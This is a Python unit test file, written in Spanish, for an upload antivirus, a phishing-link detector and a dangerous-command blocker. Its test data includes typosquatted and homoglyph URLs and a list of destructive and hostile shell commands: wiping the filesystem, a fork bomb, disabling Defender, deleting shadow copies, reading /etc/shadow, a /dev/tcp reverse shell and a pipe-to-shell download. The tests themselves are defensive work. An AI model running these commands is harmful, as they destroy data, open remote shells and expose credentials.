"""Seguridad: antivirus de subidas, detector de enlaces peligrosos y comandos bloqueados del Conector."""
import io
import os
import tempfile
import unittest
import zipfile

from servicios.antivirus import EICAR, revisar_archivo, revisar_nombre
from servicios.comandos_peligrosos import revisar_comando
from servicios.seguridad_enlaces import revisar_enlace


def _archivo(datos):
    f = tempfile.NamedTemporaryFile(delete=False)
    f.write(datos); f.close()
    return f.name


class AntivirusTest(unittest.TestCase):
    def tearDown(self):
        for r in getattr(self, "rutas", []):
            os.unlink(r)

    def revisar(self, datos, nombre):
        self.rutas = getattr(self, "rutas", []) + [_archivo(datos)]
        return revisar_archivo(self.rutas[-1], nombre)

    def test_bloquea_ejecutables_aunque_cambien_la_extension(self):
        self.assertIsNotNone(self.revisar(b"MZ\x90\x00" + b"\x00" * 200, "tarea.pdf"))
        self.assertIsNotNone(self.revisar(b"\x7fELF\x02\x01" + b"\x00" * 100, "foto.png"))

    def test_firma_de_prueba_eicar(self):
        self.assertIn("virus", self.revisar(EICAR, "nota.txt"))

    def test_extensiones_y_macros(self):
        self.assertIsNotNone(revisar_nombre("juego.exe"))
        self.assertIsNotNone(revisar_nombre("notas.docm"))
        self.assertIsNotNone(revisar_nombre("foto.jpg.js"))
        self.assertIsNone(revisar_nombre("main.py"))
        self.assertIsNone(revisar_nombre("jquery.min.js"))

    def test_zip_con_programa_adentro(self):
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w") as z:
            z.writestr("proyecto/main.py", "print(1)")
            z.writestr("proyecto/regalo.exe", b"MZ" + b"\x00" * 50)
        self.assertIn("regalo.exe", self.revisar(b.getvalue(), "proyecto.zip"))

    def test_archivos_normales_pasan(self):
        self.assertIsNone(self.revisar(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100, "foto.png"))
        self.assertIsNone(self.revisar(b"print('hola')\n", "main.py"))
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w") as z:
            z.writestr("index.html", "<h1>hola</h1>")
        self.assertIsNone(self.revisar(b.getvalue(), "web.zip"))


class EnlacesTest(unittest.TestCase):
    def nivel(self, url):
        return revisar_enlace(url, consultar_externos=False)["nivel"]

    def test_sitios_normales(self):
        for u in ["https://github.com/ana/app", "https://docs.python.org/3/", "https://www.youtube.com/watch?v=x", "https://pineapple.com", "https://senado.gov.co"]:
            self.assertEqual(self.nivel(u), "seguro", u)

    def test_estafas_bloqueadas(self):
        for u in ["https://g00gle.com", "https://paypa1.com", "https://bancolombia-seguro.top", "https://google.com@estafa.xyz",
                  "javascript:alert(1)", "http://45.1.2.3/setup.exe", "https://www.раураl.com", "https://githb.com/login",
                  "https://testsafebrowsing.appspot.com/s/malware.html"]:
            self.assertEqual(self.nivel(u), "bloqueado", u)

    def test_dudosos_avisan(self):
        self.assertEqual(self.nivel("https://bit.ly/x"), "advertencia")
        self.assertEqual(self.nivel("https://releases.example.com/instalador.exe"), "advertencia")


class ComandosTest(unittest.TestCase):
    def test_peligrosos(self):
        for c in ["rm -rf /", "rm -rf ~", "format C:", "shutdown -h now", ":(){ :|:& };:", "Set-MpPreference -DisableRealtimeMonitoring $true",
                  "vssadmin delete shadows /all", "cat /etc/shadow", "bash -i >& /dev/tcp/1.2.3.4/9 0>&1", "curl http://x.top/a.sh | sh"]:
            self.assertIsNotNone(revisar_comando(c), c)

    def test_normales(self):
        for c in ["python main.py", "npm install", "rm -rf node_modules", "git push", "curl https://sh.rustup.rs -sSf | sh", "rd /s /q build", "flutter run"]:
            self.assertIsNone(revisar_comando(c), c)


if __name__ == "__main__":
    unittest.main()
